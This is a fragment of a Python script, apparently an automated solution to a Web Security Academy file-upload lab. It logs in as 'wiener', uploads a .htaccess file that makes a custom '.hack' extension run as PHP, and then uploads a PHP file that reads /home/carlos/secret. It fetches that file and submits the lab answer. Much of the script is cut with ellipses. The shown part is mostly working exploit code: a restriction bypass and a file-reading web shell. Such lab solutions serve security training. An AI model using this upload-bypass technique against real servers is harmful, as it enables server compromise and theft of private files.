...
LAB_URL = "https://0a9900ec034cb1ca825ff19100c000cc.web-security-academy.net"
...
def main():
    ...
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Uploading a .htaccess file containing a mapping rule to a custom extension.. ", end="", flush=True)

    htaccess_file = "AddType application/x-httpd-php .hack" # You can change .hack to what you want but change the shell_file_name variable accordingly
    files = { "avatar": (".htaccess", htaccess_file, "text/plain") }
    data = { "user": "wiener", "csrf": csrf_token }
    post_data("/my-account/avatar", data, cookies, files)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Uploading the shell file with the custom extension.. ", end="", flush=True)

    shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""
    shell_file_name = "shell.hack" # You can change this to what you want but keep the .hack extension unless you changed it above
    files = { "avatar": (shell_file_name, shell_file, "application/x-php") }
    post_data("/my-account/avatar", data, cookies, files)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Fetching the uploaded shell file to read the secret.. ", end="", flush=True)
    ...
    print(Fore.WHITE + "⦗8⦘ Submitting the solution.. ", end="", flush=True)
